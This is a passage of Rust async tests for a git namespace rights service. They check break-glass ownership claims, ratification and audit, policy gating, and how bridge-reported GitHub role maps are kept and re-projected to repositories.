async fn break_glass_refuses_what_the_actor_could_not_grant_anyone() {
    let f = carol_admin_fixture().await;
    // Bob owns widgets but holds nothing over the namespace.
    let out = break_glass(&f, &f.bob, "git.ns.admin", "github.com/acme").await;
    assert!(
        matches!(
            code(&out).as_str(),
            "git-ns:escalation" | "permissionDenied" | "git-ns:scopeViolation"
        ),
        "{}",
        code(&out)
    );
    // Wrong level.
    let out = break_glass(&f, &f.carol, "git.repo.own", "github.com/acme").await;
    assert_eq!(code(&out), "git-ns:scopeViolation");
}

#[tokio::test]
async fn break_glass_policy_can_disable_or_delay_it() {
    let f = carol_admin_fixture().await;
    let with = |extra: &str| {
        format!(
            r#"package vtc.git_namespace

import rego.v1

settings := {{"maintainer_grants_commit": false, "cascade_on_departure": false, "role_drift": "report", {extra}}}

default decision := {{"effect": "allow"}}
"#
        )
    };
    activate_git_policy(&f, &with(r#""break_glass": "disabled""#)).await;
    let out = break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await;
    assert_eq!(code(&out), "git-ns/right/break-glass:disabled");

    activate_git_policy(&f, &with(r#""break_glass_min_justification_chars": 500"#)).await;
    let out = break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await;
    assert_eq!(code(&out), "git-ns:policyDenied");

    activate_git_policy(&f, &with(r#""break_glass_delay_seconds": 3600"#)).await;
    let body = ok(&break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await);
    assert!(body["right"]["breakGlass"]["effectiveAt"].is_string());
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let id = repo_id(&snap, "github.com/acme/widgets");
    assert!(
        !super::rules::owners(&snap, &id, super::ops::now()).contains(&f.carol.did),
        "a delayed break-glass confers nothing yet"
    );
    // …and is revocable while it waits, by a community administrator.
    ok(&send_ver(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        "0.3",
        json!({ "subject": f.carol.did, "right": "git.repo.own", "resource": "github.com/acme/widgets" }),
    )
    .await);
    // A policy that denies the action outright is a policy refusal.
    activate_git_policy(&f, &policy_denying("right.breakGlass")).await;
    let out = break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await;
    assert_eq!(code(&out), "git-ns:policyDenied");
}

#[tokio::test]
async fn a_community_administrator_breaks_the_glass_only_on_a_headless_namespace() {
    let f = fixture().await;
    let dana = Party::new();
    seed_acl(&f.vtc.state, &dana.did, VtcRole::Admin).await;
    bind_manual(&f).await;
    let out = break_glass(&f, &dana, "git.ns.admin", "github.com/acme").await;
    assert_eq!(code(&out), "git-ns/right/break-glass:notHeadless");
    assert!(!String::from_utf8_lossy(&out.body).contains(&f.admin.did));

    crate::acl::delete_acl_entry(&f.vtc.state.acl_ks, &f.admin.did)
        .await
        .unwrap();
    let body = ok(&break_glass(&f, &dana, "git.ns.admin", "github.com/acme").await);
    assert_eq!(body["right"]["subject"], json!(dana.did));
    let rows = bg_audit_rows(&f).await;
    assert_eq!(
        rows.last().unwrap().entitlement.as_deref(),
        Some("communityAdministratorHeadless")
    );
}

#[tokio::test]
async fn ratify_is_someone_elses_bound_to_the_break_glass_read() {
    let f = carol_admin_fixture().await;
    let body = ok(&break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await);
    let at = body["right"]["breakGlass"]["at"].clone();
    assert_eq!(
        code(&ratify_as(&f, &f.carol, &f.carol.did, at.clone()).await),
        "git-ns/right/ratify:selfRatification"
    );
    assert_eq!(
        code(&ratify_as(&f, &f.admin, &f.carol.did, json!("2020-01-01T00:00:00Z")).await),
        "git-ns/right/ratify:recordChanged"
    );
    // Bob owns widgets explicitly and could grant own there — but under the
    // default gate an owner-class grant needs a community administrator.
    let out = ratify_as(&f, &f.bob, &f.carol.did, at.clone()).await;
    assert_eq!(code(&out), "permissionDenied");

    let body = ok(&ratify_as(&f, &f.admin, &f.carol.did, at.clone()).await);
    assert_eq!(
        body["right"]["breakGlass"]["ratifiedBy"],
        json!(f.admin.did)
    );
    assert_eq!(
        code(&ratify_as(&f, &f.admin, &f.carol.did, at).await),
        "git-ns/right/ratify:notBreakGlass"
    );
    let rows = bg_audit_rows(&f).await;
    assert_eq!(rows.last().unwrap().event, "ratified");
}

#[tokio::test]
async fn a_ratifier_whose_own_authority_is_an_unratified_break_glass_is_refused() {
    // With the consent stand-in off, an owner may ratify an owner-class
    // break-glass on their repository — but only through a confirmed right.
    let cfg = GitNsConfig {
        elevated_requires_admin: false,
        ..GitNsConfig::default()
    };
    let f = fixture_with(cfg).await;
    active_repo(&f).await;
    let (dan, erin) = (Party::new(), Party::new());
    seed_acl(&f.vtc.state, &dan.did, VtcRole::Member).await;
    seed_acl(&f.vtc.state, &erin.did, VtcRole::Member).await;
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let scope = Scope::Repo(repo_id(&snap, "github.com/acme/widgets"));
    let mut set = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap();
    let at = super::ops::now();
    for who in [&dan, &erin] {
        let mut row = super::ops::new_row(&who.did, super::model::Right::RepoOwn, &who.did, true);
        row.break_glass = Some(super::model::BreakGlassMark {
            by: who.did.clone(),
            at,
            justification: "nobody else".into(),
            effective_at: None,
            ratified_by: None,
            ratified_at: None,
        });
        set.rows.push(row);
    }
    store::put_rights(&f.vtc.state.git_ns.ks, &scope, &set)
        .await
        .unwrap();
    let at = json!(super::wire::timestamp(at));
    let out = ratify_as(&f, &dan, &erin.did, at.clone()).await;
    assert_eq!(
        code(&out),
        "permissionDenied",
        "a break-glass cannot confirm a break-glass"
    );
    ok(&ratify_as(&f, &f.bob, &erin.did, at).await);
}

#[tokio::test]
async fn an_unratified_break_glass_never_counts_toward_the_invariants() {
    let f = carol_admin_fixture().await;
    ok(&break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await);
    // Bob is still the last *counting* owner: his resignation is refused
    // even though Carol's break-glass record exists.
    let out = send_ver(
        &f.vtc.state,
        &f.bob,
        "right/revoke",
        "0.3",
        json!({ "subject": f.bob.did, "right": "git.repo.own", "resource": "github.com/acme/widgets" }),
    )
    .await;
    assert_eq!(code(&out), "git-ns:lastOwner");
    // A community administrator with no git right of their own revokes the
    // break-glass; the revocation is audited as one.
    let dana = Party::new();
    seed_acl(&f.vtc.state, &dana.did, VtcRole::Admin).await;
    let body = ok(&send_ver(
        &f.vtc.state,
        &dana,
        "right/revoke",
        "0.3",
        json!({ "subject": f.carol.did, "right": "git.repo.own", "resource": "github.com/acme/widgets", "reason": "not needed" }),
    )
    .await);
    assert!(body["revoked"]["breakGlass"].is_object());
    assert_eq!(bg_audit_rows(&f).await.last().unwrap().event, "revoked");
}

#[tokio::test]
async fn the_break_glass_audience_is_every_other_administrator() {
    let f = carol_admin_fixture().await;
    let dana = Party::new();
    seed_acl(&f.vtc.state, &dana.did, VtcRole::Admin).await;
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let ns = snap.namespaces[0].clone();
    let got = super::break_glass::audience(&f.vtc.state, &snap, &ns, &f.carol.did)
        .await
        .unwrap();
    let mut want = vec![f.admin.did.clone(), dana.did.clone()];
    want.sort();
    assert_eq!(
        got, want,
        "community admins and ns admins, never the actor, never a plain member"
    );
    let got = super::break_glass::audience(&f.vtc.state, &snap, &ns, &f.admin.did)
        .await
        .unwrap();
    assert!(got.contains(&f.carol.did) && got.contains(&dana.did) && !got.contains(&f.bob.did));
}

#[tokio::test]
async fn view_0_4_shows_an_unratified_break_glass_to_every_administrator_it_concerns() {
    let f = carol_admin_fixture().await;
    ok(&break_glass(&f, &f.carol, "git.repo.own", "github.com/acme/widgets").await);
    let dana = Party::new();
    seed_acl(&f.vtc.state, &dana.did, VtcRole::Admin).await;
    let dan = Party::new();
    seed_acl(&f.vtc.state, &dan.did, VtcRole::Member).await;
    let flagged = |v: &Value| {
        v["rights"]
            .as_array()
            .unwrap()
            .iter()
            .any(|r| r["breakGlass"]["justification"].is_string())
    };
    // A community administrator with no git right sees it.
    let v = ok(&send_ver(&f.vtc.state, &dana, "view", "0.4", json!({})).await);
    assert!(flagged(&v), "{v}");
    // Bob, owner of the repository, sees it.
    let v = ok(&send_ver(&f.vtc.state, &f.bob, "view", "0.4", json!({})).await);
    assert!(flagged(&v), "{v}");
    // A member with nothing to do with it does not.
    let v = ok(&send_ver(&f.vtc.state, &dan, "view", "0.4", json!({})).await);
    assert!(!flagged(&v), "{v}");
    // 0.2 carries no breakGlass member at all.
    let v = ok(&send_ver(&f.vtc.state, &f.bob, "view", "0.2", json!({})).await);
    assert!(!v.to_string().contains("breakGlass"));

    // The console list: the community administrator and Carol's co-admin read
    // it; a plain member session is refused.
    let (status, body) = get(&f, &dana.did, vec![], "/git-ns/break-glass").await;
    assert_eq!(status, 200, "{body}");
    assert_eq!(body["items"][0]["state"], "unratified");
    assert_eq!(body["items"][0]["namespaceResource"], "github.com/acme");
    let (status, _) = get(&f, &f.bob.did, vec!["ops".into()], "/git-ns/break-glass").await;
    assert_eq!(status, 403);
    let (status, body) = get(&f, &f.admin.did, vec![], "/git-ns/rights").await;
    assert_eq!(status, 200);
    assert!(
        body["rights"]
            .as_array()
            .unwrap()
            .iter()
            .any(|r| r["breakGlass"]["by"] == json!(f.carol.did))
    );
    let (_, act) = get(&f, &f.admin.did, vec![], "/git-ns/activity").await;
    assert!(
        act["items"]
            .as_array()
            .unwrap()
            .iter()
            .any(|i| i["action"] == "gitNs.right.breakGlass")
    );
}

// ── the bridge's role map (git-ns/bridge/event 0.3) and re-projection ───────

fn uri3(task: &str) -> String {
    format!("{URI}/{task}/0.3")
}

/// A GitHub organisation's ladder.
fn org_ladder() -> Value {
    json!(["read", "triage", "write", "maintain", "admin"])
}

/// `event` as `f`'s bridge reports it, with a GitHub organisation's ladder
/// unless it names one, issued `ago` before now.
async fn report_role_map_from(
    f: &Fixture,
    bridge: &Party,
    ns: &str,
    mut event: Value,
    ago: chrono::TimeDelta,
) -> TrustTaskOutcome {
    if event.get("ladder").is_none() {
        event["ladder"] = org_ladder();
    }
    let mut doc: TrustTask<Value> = vta_sdk::trust_task_sign::build_unsigned(
        &uri3("bridge/event"),
        json!({ "namespace": ns, "event": event }),
        &bridge.did,
        TEST_VTC_DID,
    )
    .unwrap();
    doc.issued_at = doc.issued_at.map(|t| t - ago);
    let key =
        vta_sdk::trust_task_sign::HolderKey::from_did_key(&bridge.did, &bridge.secret_multibase)
            .unwrap();
    vta_sdk::trust_task_sign::sign_in_place_with(&mut doc, &key)
        .await
        .unwrap();
    let body = serde_json::to_vec(&doc).unwrap();
    dispatch_trust_task_core(&f.vtc.state, &JoinAuthCtx::rest(), &body).await
}

async fn report_role_map(f: &Fixture, ns: &str, event: Value) -> TrustTaskOutcome {
    report_role_map_from(f, &f.bridge_party, ns, event, chrono::TimeDelta::zero()).await
}

/// The default map, as a bridge on a GitHub organisation reports it.
async fn report_default_map(f: &Fixture, ns: &str) {
    ok(&report_role_map(
        f,
        ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" } }),
    )
    .await);
}

/// The `projectRoles` jobs queued for `repo`, oldest first.
async fn role_jobs_for(f: &Fixture, repo: &str) -> Vec<super::bridge::BridgeJob> {
    let mut jobs: Vec<_> = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .filter(|j| j.kind == super::bridge::JobKind::ProjectRoles && j.payload["repo"] == repo)
        .collect();
    jobs.sort_by_key(|j| j.created_at);
    jobs
}

async fn namespace_now(f: &Fixture, ns: &str) -> super::model::Namespace {
    Snapshot::load(&f.vtc.state.git_ns.ks)
        .await
        .unwrap()
        .namespace(ns)
        .unwrap()
        .clone()
}

#[tokio::test]
async fn a_role_map_report_is_kept_and_its_stale_repositories_are_reprojected() {
    let (f, ns) = drift_fixture(json!([])).await;
    super::bridge::project_roles(&f.vtc.state, false)
        .await
        .unwrap();
    let before = role_jobs_for(&f, RES).await.len();
    ok(&report_role_map(
        &f,
        &ns,
        json!({
            "type": "roleMapReported",
            "roleMap": { "own": "admin", "maintain": "admin", "commit": "none" },
            "repos": [{ "resource": RES, "roleMap": { "own": "admin", "maintain": "admin", "commit": "write" } }],
            "stale": [RES],
        }),
    )
    .await);
    let n = namespace_now(&f, &ns).await;
    assert_eq!(
        super::role_map::source(&n),
        super::role_map::Source::Reported
    );
    let m = super::role_map::for_repo(&n, RES).unwrap();
    assert_eq!(m.commit, super::role_map::ForgeLevel::Write);
    assert!(super::role_map::is_stale(&n, RES));
    let nm = super::role_map::for_namespace(&n).unwrap();
    assert_eq!(nm.commit, super::role_map::ForgeLevel::None);

    // Re-projected without anyone asking: the projector sends it again.
    super::bridge::project_roles(&f.vtc.state, false)
        .await
        .unwrap();
    let jobs = role_jobs_for(&f, RES).await;
    assert_eq!(jobs.len(), before + 1, "{jobs:?}");
    // Its success takes the repository off `stale`.
    let job = jobs.last().unwrap();
    ok(&send(
        &f.vtc.state,
        &f.bridge_party,
        "bridge/result",
        json!({
            "jobId": job.job_id, "outcome": "succeeded",
            "repo": { "resource": RES, "forgeId": "100" },
            "steps": [{ "step": "roles", "outcome": "applied" }],
        }),
    )
    .await);
    assert!(!super::role_map::is_stale(
        &namespace_now(&f, &ns).await,
        RES
    ));
}

#[tokio::test]
async fn a_role_map_report_is_refused_unordered_or_outside_its_namespace() {
    let (f, ns) = drift_fixture(json!([])).await;
    let out = report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "write", "maintain": "admin", "commit": "none" } }),
    )
    .await;
    assert_eq!(code(&out), "malformedRequest");
    let out = report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" },
                "stale": ["github.com/beta/tools"] }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    let out = report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" },
                "repos": [{ "resource": "github.com/beta/tools", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" } }] }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    // Nothing was kept: the default map the bridge reported still stands.
    assert_eq!(
        super::role_map::for_namespace(&namespace_now(&f, &ns).await),
        Some(
            super::role_map::RoleMap::new(
                super::role_map::ForgeLevel::Admin,
                super::role_map::ForgeLevel::Maintain,
                super::role_map::ForgeLevel::None
            )
            .unwrap()
        )
    );
    // Only the namespace's own bridge reports it.
    let out = send_v(
        &f.vtc.state,
        &f.stranger,
        &uri3("bridge/event"),
        json!({ "namespace": ns, "event": { "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" }, "ladder": org_ladder() } }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
}

#[tokio::test]
async fn drift_adopt_derives_the_right_from_the_bridges_role_map() {
    let (f, ns) = drift_fixture(json!([])).await;
    // Maintainers get `admin` here: a forge `admin` is a maintainer's role.
    ok(&report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "admin", "commit": "none" } }),
    )
    .await);
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "admin" }]),
    )
    .await;
    let body = ok(&resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": carol_acct(), "observed": "admin" }),
        "adopt",
    )
    .await);
    assert_eq!(body["right"]["right"], "git.repo.maintain");
}

#[tokio::test]
async fn drift_adopt_refuses_a_role_no_right_projects_to_under_the_map() {
    let (f, ns) = drift_fixture(json!([])).await;
    // Owners get only `maintain`: nothing projects to `admin`.
    ok(&report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "maintain", "maintain": "write", "commit": "none" } }),
    )
    .await);
    report_drift(
        &f,
        &ns,
        json!([{ "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "admin" }]),
    )
    .await;
    let out = resolve(
        &f,
        &f.bob,
        json!({ "type": "roleAdded", "account": carol_acct(), "observed": "admin" }),
        "adopt",
    )
    .await;
    assert_eq!(code(&out), super::drift::NO_MATCHING_RIGHT);
}

#[tokio::test]
async fn reproject_queues_every_repository_for_a_namespace_admin_or_community_admin() {
    let (f, _ns) = drift_fixture(json!([])).await;
    adopt_with_forge_id(&f, "github.com/acme/gadgets", "101").await;
    super::bridge::project_roles(&f.vtc.state, false)
        .await
        .unwrap();
    let before = role_jobs_for(&f, RES).await.len();
    // The community administrator (who is also the binding's admin).
    let body = ok(&send(
        &f.vtc.state,
        &f.admin,
        "roles/reproject",
        json!({ "resource": "github.com/acme", "reason": "role map changed" }),
    )
    .await);
    let mut repos: Vec<String> = serde_json::from_value(body["repos"].clone()).unwrap();
    repos.sort();
    assert_eq!(
        repos,
        vec!["github.com/acme/gadgets".to_string(), RES.to_string()]
    );
    // Queued now, with the complete set, though nothing changed.
    assert_eq!(role_jobs_for(&f, RES).await.len(), before + 1);
    assert!(
        !role_jobs_for(&f, "github.com/acme/gadgets")
            .await
            .is_empty()
    );

    // A namespace admin by explicit record, who is not a community admin.
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await);
    let body = ok(&send(
        &f.vtc.state,
        &f.carol,
        "roles/reproject",
        json!({ "resource": RES }),
    )
    .await);
    assert_eq!(body["repos"], json!([RES]));
}

#[tokio::test]
async fn reproject_is_an_owners_for_their_repository_only_and_refused_without_a_bridge() {
    let (f, ns) = drift_fixture(json!([])).await;
    // Bob owns widgets: he may re-project it…
    let body = ok(&send(
        &f.vtc.state,
        &f.bob,
        "roles/reproject",
        json!({ "resource": RES }),
    )
    .await);
    assert_eq!(body["repos"], json!([RES]));
    // …but not the namespace, nor a repository he does not own, and a
    // caller entitled to nothing is not told whether a name is recorded.
    for resource in ["github.com/acme", "github.com/acme/nothing-here"] {
        let out = send(
            &f.vtc.state,
            &f.bob,
            "roles/reproject",
            json!({ "resource": resource }),
        )
        .await;
        assert_eq!(code(&out), "permissionDenied", "{resource}");
    }
    // Carol holds nothing here.
    let out = send(
        &f.vtc.state,
        &f.carol,
        "roles/reproject",
        json!({ "resource": RES }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    let out = send(
        &f.vtc.state,
        &f.admin,
        "roles/reproject",
        json!({ "resource": "github.com/acme/nothing-here" }),
    )
    .await;
    assert_eq!(code(&out), super::ops::UNKNOWN_REPO);
    let out = send(
        &f.vtc.state,
        &f.admin,
        "roles/reproject",
        json!({ "resource": "github.com/nobody" }),
    )
    .await;
    assert_eq!(code(&out), super::ops::UNKNOWN_NAMESPACE);

    ok(&event(&f, &ns, json!({ "type": "installationRemoved" })).await);
    let out = send(
        &f.vtc.state,
        &f.admin,
        "roles/reproject",
        json!({ "resource": RES }),
    )
    .await;
    assert_eq!(code(&out), super::reproject::NO_FORGE_ACCESS);

    let g = fixture().await;
    let _manual = bind_manual(&g).await;
    let out = send(
        &g.vtc.state,
        &g.admin,
        "roles/reproject",
        json!({ "resource": "github.com/acme" }),
    )
    .await;
    assert_eq!(code(&out), super::reproject::MANUAL_MODE);
}

// ── review of #1736: an unknown role map, report order, the ladder ──────────

fn maintain_adopt() -> Value {
    json!({ "type": "roleAdded", "account": carol_acct(), "observed": "maintain" })
}

fn maintain_drift() -> Value {
    json!([{ "type": "roleAdded", "resource": RES, "account": carol_acct(), "observed": "maintain" }])
}

#[tokio::test]
async fn adopt_is_refused_after_binding_until_the_bridge_reports_its_map() {
    let (f, ns) = drift_fixture_unreported(maintain_drift()).await;
    // Bound, and no report yet: the default is not assumed.
    let out = resolve(&f, &f.bob, maintain_adopt(), "adopt").await;
    assert_eq!(code(&out), super::drift::ROLE_MAP_UNKNOWN);
    let (status, body) = get(&f, &f.admin.did, vec![], "/git-ns/namespaces").await;
    assert_eq!(status, 200, "{body}");
    assert_eq!(body["namespaces"][0]["roleMapSource"], "unknown");
    assert!(body["namespaces"][0].get("roleMap").is_none(), "{body}");
    // The bridge reports the default: now it holds.
    report_default_map(&f, &ns).await;
    let body = ok(&resolve(&f, &f.bob, maintain_adopt(), "adopt").await);
    assert_eq!(body["right"]["right"], "git.repo.maintain");
}

#[tokio::test]
async fn adopt_is_refused_after_the_namespace_changes_bridge_until_the_new_one_reports() {
    let (f, ns) = drift_fixture(maintain_drift()).await;
    // Another bridge now serves the namespace (a reseat of its bridge).
    let new_bridge = Party::new();
    let mut n = namespace_now(&f, &ns).await;
    n.bridge_did = Some(new_bridge.did.clone());
    store::put_namespace(&f.vtc.state.git_ns.ks, &n)
        .await
        .unwrap();
    let out = resolve(&f, &f.bob, maintain_adopt(), "adopt").await;
    assert_eq!(code(&out), super::drift::ROLE_MAP_UNKNOWN);
    // The old bridge's report is not the new one's, whatever its issuedAt.
    let out = report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" } }),
    )
    .await;
    assert_eq!(code(&out), "permissionDenied");
    // The new bridge reports — earlier than the old report, which it is
    // never compared with.
    ok(&report_role_map_from(
        &f,
        &new_bridge,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" } }),
        chrono::TimeDelta::seconds(30),
    )
    .await);
    let body = ok(&resolve(&f, &f.bob, maintain_adopt(), "adopt").await);
    assert_eq!(body["right"]["right"], "git.repo.maintain");
}

#[tokio::test]
async fn a_role_map_report_issued_before_the_one_held_is_acknowledged_and_ignored() {
    let (f, ns) = drift_fixture(json!([])).await;
    let admin_map = json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "admin", "commit": "none" } });
    ok(&report_role_map(&f, &ns, admin_map.clone()).await);
    // An earlier report, arriving late: acknowledged, applied in no part.
    ok(&report_role_map_from(
        &f,
        &f.bridge_party,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "write", "maintain": "write", "commit": "none" }, "stale": [RES] }),
        chrono::TimeDelta::seconds(60),
    )
    .await);
    let n = namespace_now(&f, &ns).await;
    let m = super::role_map::for_namespace(&n).unwrap();
    assert_eq!(m.maintain, super::role_map::ForgeLevel::Admin);
    assert!(!super::role_map::is_stale(&n, RES));
    // A later one replaces it.
    ok(&report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "maintain", "commit": "none" } }),
    )
    .await);
    let m = super::role_map::for_namespace(&namespace_now(&f, &ns).await).unwrap();
    assert_eq!(m.maintain, super::role_map::ForgeLevel::Maintain);
}

#[tokio::test]
async fn a_role_map_report_off_the_forges_ladder_is_refused() {
    let (f, ns) = drift_fixture(json!([])).await;
    // A GitHub organisation has no ladder of `write` alone…
    let out = report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "write", "maintain": "write", "commit": "none" }, "ladder": ["write"] }),
    )
    .await;
    assert_eq!(code(&out), "malformedRequest");
    // …and a map names only levels on the ladder it reports.
    let out = report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "triage", "commit": "none" }, "ladder": ["read", "write", "maintain", "admin"] }),
    )
    .await;
    assert_eq!(code(&out), "malformedRequest");
}

#[tokio::test]
async fn a_stale_repository_the_vtc_does_not_reproject_is_not_kept() {
    let (f, ns) = drift_fixture(json!([])).await;
    ok(&report_role_map(
        &f,
        &ns,
        json!({ "type": "roleMapReported", "roleMap": { "own": "admin", "maintain": "admin", "commit": "none" },
                "stale": [RES, "github.com/acme/never-recorded"] }),
    )
    .await);
    let n = namespace_now(&f, &ns).await;
    assert_eq!(n.role_map.unwrap().stale, vec![RES.to_string()]);
}

#[tokio::test]
async fn an_unknown_map_weighs_a_maintain_revert_as_revoking_own() {
    // The console reads the impact from the map: with none reported, any
    // role could be the one `own` projects to.
    let (f, ns) = drift_fixture_unreported(maintain_drift()).await;
    let n = namespace_now(&f, &ns).await;
    assert!(super::role_map::revert_takes_ownership(&n, RES, "maintain"));
    report_default_map(&f, &ns).await;
    let n = namespace_now(&f, &ns).await;
    assert!(!super::role_map::revert_takes_ownership(
        &n, RES, "maintain"
    ));
}

// ── a namespace admin gets no forge role (decision 2026-09-25) ──────────────

fn admin_acct() -> Value {
    json!({ "forge": "github.com", "id": "5550777", "login": "admin-a" })
}

/// The `projectRoles` jobs queued so far, newest last.
async fn role_jobs(f: &Fixture) -> Vec<Value> {
    super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .filter(|j| j.kind == super::bridge::JobKind::ProjectRoles)
        .map(|j| j.payload)
        .collect()
}

fn desired_right(job: &Value, did: &str) -> Option<String> {
    job["desiredRoles"]
        .as_array()
        .unwrap()
        .iter()
        .find(|r| r["subject"] == did)
        .map(|r| r["right"].as_str().unwrap().to_string())
}

#[tokio::test]
async fn a_namespace_admin_is_projected_at_no_role_and_an_explicit_owner_as_owner() {
    let (f, ns) = drift_fixture(json!([])).await;
    link_account(&f, &ns, &f.admin, "5550777", "admin-a").await;
    link_account(&f, &ns, &f.bob, "9120045", "bob-builds").await;
    super::bridge::project_roles(&f.vtc.state, true)
        .await
        .unwrap();
    let jobs = role_jobs(&f).await;
    // No namespace-level job: nothing projects to the organisation's roles.
    assert!(jobs.iter().all(|j| j.get("repo").is_some()), "{jobs:?}");
    let job = &current_role_job(&f).await;
    // The admin, with no right of their own on `widgets`: `git.ns.admin`,
    // which the bridge maps to no role — not the `own` it implies.
    assert_eq!(
        desired_right(job, &f.admin.did).as_deref(),
        Some("git.ns.admin")
    );
    assert_eq!(
        desired_right(job, &f.bob.did).as_deref(),
        Some("git.repo.own")
    );
    // Carol holds nothing here, so she is not listed.
    assert_eq!(desired_right(job, &f.carol.did), None);

    // Bob made a namespace admin as well: still sent as the owner he is.
    ok(&grant(&f, &f.admin, &f.bob.did, "git.ns.admin", "github.com/acme").await);
    super::bridge::project_roles(&f.vtc.state, true)
        .await
        .unwrap();
    let jobs = role_jobs(&f).await;
    assert!(jobs.iter().all(|j| j.get("repo").is_some()));
    let job = &current_role_job(&f).await;
    assert_eq!(
        desired_right(job, &f.bob.did).as_deref(),
        Some("git.repo.own")
    );
    assert_eq!(
        desired_right(job, &f.admin.did).as_deref(),
        Some("git.ns.admin")
    );
    // One entry per account.
    let n = job["desiredRoles"].as_array().unwrap().len();
    assert_eq!(n, 2, "{job}");
}

#[tokio::test]
async fn a_namespace_commit_right_is_projected_as_commit_sign() {
    let (f, ns) = drift_fixture(json!([])).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.commit.sign",
        "github.com/acme",
    )
    .await);
    let _ = ns;
    assert_eq!(
        projected(&f, &f.carol.did).await.as_deref(),
        Some("git.commit.sign")
    );
}

fn carol_is_admin_acct() -> Value {
    carol_acct()
}

/// The latest `desiredRoles` right for `did` on `widgets`, after a forced
/// projection.
async fn projected(f: &Fixture, did: &str) -> Option<String> {
    super::bridge::project_roles(&f.vtc.state, true)
        .await
        .unwrap();
    desired_right(&current_role_job(f).await, did)
}

/// The one queued `projectRoles` job for `widgets` that a newer one has not
/// superseded (jobs queued in the same instant do not sort by age).
async fn current_role_job(f: &Fixture) -> Value {
    let open: Vec<Value> = super::bridge::list_jobs(&f.vtc.state.git_ns.jobs_ks)
        .await
        .unwrap()
        .into_iter()
        .filter(|j| {
            j.kind == super::bridge::JobKind::ProjectRoles
                && j.state == super::bridge::JobState::Pending
                && j.payload["repo"] == RES
        })
        .map(|j| j.payload)
        .collect();
    assert_eq!(open.len(), 1, "{open:?}");
    open.into_iter().next().unwrap()
}

#[tokio::test]
async fn an_admin_whose_own_is_revoked_falls_back_to_no_role() {
    // Carol (account linked by the fixture) is a namespace admin; the
    // community administrator makes her an explicit owner too, then revokes
    // it. (Not a self-grant: whether an admin may grant themselves `own` is
    // a separate question.)
    let (f, _ns) = drift_fixture(json!([])).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await);
    ok(&grant(&f, &f.admin, &f.carol.did, "git.repo.own", RES).await);
    assert_eq!(
        projected(&f, &f.carol.did).await.as_deref(),
        Some("git.repo.own")
    );
    ok(&send(
        &f.vtc.state,
        &f.admin,
        "right/revoke",
        json!({ "subject": f.carol.did, "right": "git.repo.own", "resource": RES }),
    )
    .await);
    assert_eq!(
        projected(&f, &f.carol.did).await.as_deref(),
        Some("git.ns.admin")
    );
}

#[tokio::test]
async fn an_admin_whose_own_lapses_falls_back_to_no_role() {
    let (f, _ns) = drift_fixture(json!([])).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
        "github.com/acme",
    )
    .await);
    ok(&grant(&f, &f.admin, &f.carol.did, "git.repo.own", RES).await);
    // Lapsed, unswept.
    let snap = Snapshot::load(&f.vtc.state.git_ns.ks).await.unwrap();
    let scope = Scope::Repo(snap.repo_at(RES).unwrap().id.clone());
    let mut set = store::get_rights(&f.vtc.state.git_ns.ks, &scope)
        .await
        .unwrap();
    for r in set.rows.iter_mut().filter(|r| r.subject == f.carol.did) {
        r.expires_at = Some("2020-01-01T00:00:00Z".parse().unwrap());
    }
    store::put_rights(&f.vtc.state.git_ns.ks, &scope, &set)
        .await
        .unwrap();
    assert_eq!(
        projected(&f, &f.carol.did).await.as_deref(),
        Some("git.ns.admin")
    );
}

#[tokio::test]
async fn a_departed_admin_is_not_projected() {
    let (f, _ns) = drift_fixture(json!([])).await;
    ok(&grant(
        &f,
        &f.admin,
        &f.carol.did,
        "git.ns.admin",
